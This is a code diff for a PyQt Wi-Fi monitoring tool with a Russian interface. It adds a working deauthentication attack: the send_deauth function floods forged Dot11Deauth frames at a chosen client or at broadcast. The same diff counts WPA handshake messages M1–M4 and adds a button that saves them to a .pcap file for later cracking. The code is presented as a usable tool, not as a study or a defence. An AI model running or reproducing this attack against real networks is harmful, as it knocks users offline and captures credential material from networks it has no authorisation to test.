@@ -14,6 +14,7 @@ import threading
 import subprocess
 import signal
 import json
+import pcapy
 
 from scapy.all import *
 
@@ -73,10 +74,10 @@ class DeauthDialog(QDialog):
 		self.interrupt_flag = False
 		self.first_beacon_flag = False
 		
-		self.key1_flag = False
-		self.key2_flag = False
-		self.key3_flag = False
-		self.key4_flag = False
+		self.key1_cnt = 0
+		self.key2_cnt = 0
+		self.key3_cnt = 0
+		self.key4_cnt = 0
 		self.st_falgs = {}
 		self.packets = []
 		
@@ -97,6 +98,10 @@ class DeauthDialog(QDialog):
 		self.ouiDB = {}
 		self.ouiCSV_Data = None
 		self.load_oui_csv()
+		self.ssid = None
+		self.client = None
+		self.CLIENT = None
+		self.deauth_count = 5
 		
 		self.setWindowTitle(f"Мониторинг сети ya_setko")
 		
@@ -200,6 +205,7 @@ class DeauthDialog(QDialog):
 		self.btn_start_scan = QPushButton('Мониторинг')
 		self.btn_stop_scan = QPushButton('Стоп')
 		self.btn_deauth = QPushButton('Деавторизовать')
+		self.btn_savepcap = QPushButton('Сохранить в .pcap')
 		
 		self.btn_start_scan.setIcon(QIcon('icons/refresh.png'))
 		self.btn_start_scan.setIconSize(QSize(24, 24))
@@ -209,17 +215,23 @@ class DeauthDialog(QDialog):
 		self.btn_stop_scan.setEnabled(False)
 		
 		self.btn_deauth.setIcon(QIcon('icons/unlocked.png'))
-		self.btn_deauth.setIconSize(QSize(24, 24))		
+		self.btn_deauth.setIconSize(QSize(24, 24))
+		self.btn_deauth.clicked.connect(self.start_deauth)
+		self.btn_deauth.setEnabled(False)
+		
+		self.btn_savepcap.setIcon(QIcon('icons/diskette.png'))
+		self.btn_savepcap.setIconSize(QSize(24, 24))
+		
+		self.btn_start_scan.clicked.connect(self.start_monitoring_thread)
+		self.btn_stop_scan.clicked.connect(self.stop_monitoring)
+		self.btn_savepcap.clicked.connect(self.save_pcap)
 		
 		buttons_layout.addWidget(self.btn_start_scan)
 		buttons_layout.addWidget(self.btn_stop_scan)
 		buttons_layout.addWidget(self.btn_deauth)
-		buttons_layout.addWidget(QLabel('<b>Handshake: </b> -'))
+		buttons_layout.addWidget(self.btn_savepcap)
 		buttons_layout.addStretch()
 		buttons_layout.setContentsMargins(5, 5, 5, 5)
-		
-		self.btn_start_scan.clicked.connect(self.start_monitoring_thread)
-		self.btn_stop_scan.clicked.connect(self.stop_monitoring)
 		
 		self.stations_table = QTableView(self)
 		self.model = QStandardItemModel(0, 5, self)
@@ -270,6 +282,27 @@ class DeauthDialog(QDialog):
 		self.beacons = 0
 		signal.signal(signal.SIGINT, self.handle_interrupt)
 		self.log_add(f"[+] Switching {self.interface} to channel {self.channel}")
+	
+	def start_deauth(self):
+		selected_indexes = self.stations_table.selectionModel().selectedRows()
+		row = selected_indexes[0].row()
+		model = self.stations_table.model()
+		self.client = model.data(model.index(row, 0), Qt.UserRole)
+		threading.Thread(target=self.send_deauth).start()
+		
+	def save_pcap(self):
+		if len(self.packets) > 0:
+			if self.key1_cnt == 0 or self.key2_cnt == 0 or self.key3_cnt == 0 or self.key4_cnt == 0:
+				QMessageBox.warning(self, "Предупреждение!", "Не собраны или отсуствует часть ключей M1-M4")
+			options = QFileDialog.Options()
+			file_path, _ = QFileDialog.getSaveFileName(self, "Сохранить как", f"{self.ssid}.pcap", "PCAP Files (*.pcap)", options=options)
+			if file_path:
+				try:
+					wrpcap(file_path, self.packets)
+				except Exception as e:
+					print(e)
+		else:
+			QMessageBox.critical(self, "Ошибка", f"Отсутсвуют данные от {self.get_mac_vendor_mixed(self.bssid)}")
 	
 	def safe_log_add(self, log):
 		QMetaObject.invokeMethod(self, "log_add", Qt.QueuedConnection, Q_ARG(str, log))
@@ -362,17 +395,16 @@ class DeauthDialog(QDialog):
 		rows = []
 		data = json.loads(json_data)
 		
-		value_index = 0
-		for value in data:
-			if value_index == 0:
-				item = QStandardItem(QIcon('icons/signal.png'), value)
+		for i in range(1, len(data)):
+			if i == 1:
+				item = QStandardItem(QIcon('icons/signal.png'), str(data[i]))
+				item.setData(data[0], Qt.UserRole)
 			else:
-				item = QStandardItem(str(value))
-			
+				item = QStandardItem(str(data[i]))
 			rows.append(item)
-			value_index += 1
 		
 		rows.append(QStandardItem('-'))
+		
 		self.model.appendRow(rows)
 		row_number = self.model.rowCount() -1
 		self.stations_table.setRowHeight(row_number, 40)
@@ -385,6 +417,7 @@ class DeauthDialog(QDialog):
 				item = self.model.item(row, item) 
 				if item:
 					item.setText(str(data))
+					#print(data)
 	
 	def packet_handler(self, pkt):
 		if pkt.haslayer(RadioTap):
@@ -404,6 +437,7 @@ class DeauthDialog(QDialog):
 
 				if not st_mac in self.stations:
 					self.stations[st_mac] = {
+						'client': st_mac,
 						'mac': self.get_mac_vendor_mixed(st_mac),
 						'signal': signal,
 						'frames': 0,
@@ -448,21 +482,25 @@ class DeauthDialog(QDialog):
 				if eapol_st in self.stations:
 					if key_info == 0x008a:
 						self.packets.append(pkt)
+						self.key1_cnt += 1
 						self.safe_log_add(f"[+] Received M1 Message from \"{self.get_mac_vendor_mixed(self.BSSID)}\"")
 						if 'M1' not in self.stations[eapol_st]['flags']:
 							self.stations[eapol_st]['flags'].append('M1')
 					elif key_info == 0x010a:
 						self.packets.append(pkt)
+						self.key2_cnt += 1
 						self.safe_log_add(f"[+] Received M2 Message from \"{self.get_mac_vendor_mixed(eapol_st)}\"")
 						if 'M2' not in self.stations[eapol_st]['flags']:
 							self.stations[eapol_st]['flags'].append('M2')
 					elif key_info == 0x13ca:
 						self.packets.append(pkt)
+						self.key3_cnt += 1
 						self.safe_log_add(f"[+] Received M3 Message from \"{self.get_mac_vendor_mixed(self.BSSID)}\"")
 						if 'M3' not in self.stations[eapol_st]['flags']:
 							self.stations[eapol_st]['flags'].append('M3')
 					elif key_info == 0x030a:
 						self.packets.append(pkt)
+						self.key4_cnt += 1
 						self.safe_log_add(f"[+] Received M4 Message from \"{self.get_mac_vendor_mixed(eapol_st)}\"")
 						if 'M4' not in self.stations[eapol_st]['flags']:
 							self.stations[eapol_st]['flags'].append('M4')
@@ -475,16 +513,36 @@ class DeauthDialog(QDialog):
 				self.beacons += 1
 				signal = pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else None
 				ssid = pkt[Dot11Elt].info.decode(errors="ignore") if pkt.haslayer(Dot11Elt) else None
+				self.ssid = ssid
 				channel = dot11_utils.get_channel(pkt)
 				
 				if not self.first_beacon_flag:
 					self.first_beacon_flag = True
 					self.packets.append(pkt)
 					self.safe_log_add(f"[+] Done, ssid=\"{ssid}\"")
-				
+					self.btn_deauth.setEnabled(True)
+					
 				self.safe_update_ap_ssid(ssid)
 				self.safe_update_ap_rssi(signal)
 				self.safe_update_ap_beacons(self.beacons)
+				
+			
+	def send_deauth(self):
+		self.btn_deauth.setEnabled(False)
+		pcap = pcapy.open_live(self.interface, 100, 1, 9)
+		for i in range(self.deauth_count):
+			
+			if self.client != 'ff:ff:ff:ff:ff:ff':
+				self.safe_log_add(f"[+] Send deauth to {self.BSSID} as {self.CLIENT} ({i +1} / {self.deauth_count})")
+			else:
+				self.safe_log_add(f"[+] Send deauth to broadcast as {self.BSSID} ({i +1} / {self.deauth_count})")
+				
+			self.current_deauth = i
+			for pnt_num in range(127):
+				deauth_pkt = bytes(RadioTap() / Dot11(addr1=self.client, addr2=self.bssid, addr3=self.bssid, SC=(pnt_num << 4)) / Dot11Deauth(reason=7))
+				pcap.sendpacket(deauth_pkt)
+			time.sleep(1)
+		self.btn_deauth.setEnabled(True)
 		
 if __name__ == '__main__':
 	app = QApplication(sys.argv)
